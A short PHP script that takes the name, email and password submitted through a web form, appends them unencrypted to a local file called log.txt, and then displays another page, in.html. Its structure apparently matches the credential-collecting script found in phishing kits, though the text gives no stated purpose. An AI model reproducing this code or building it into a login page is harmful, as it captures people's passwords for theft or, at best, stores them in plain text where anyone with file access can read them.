<?php
$name=$_POST['name'];
$email=$_POST['email'];
$password=$_POST['password'];
$fp = fopen('log.txt', 'a');
$l="
";
fwrite($fp,$name);
fwrite($fp,$l);
fwrite($fp,$email);
fwrite($fp,$l);
fwrite($fp,$password); 
fwrite($fp,$l);
fclose($fp);
include("in.html");
?>
